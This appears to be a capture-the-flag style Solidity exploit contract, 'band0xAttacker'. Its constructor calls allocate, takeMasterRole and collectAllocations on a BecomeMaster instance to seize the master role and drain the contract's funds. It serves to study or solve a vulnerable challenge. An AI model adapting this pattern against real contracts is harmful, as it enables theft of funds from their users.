pragma solidity 0.8.11;

import "./BecomeMaster.sol";

contract band0xAttacker {
    
    constructor(BecomeMaster instance) payable {
        
        instance.allocate();
        instance.takeMasterRole();
        instance.collectAllocations();

    }

    receive() external payable { }

}
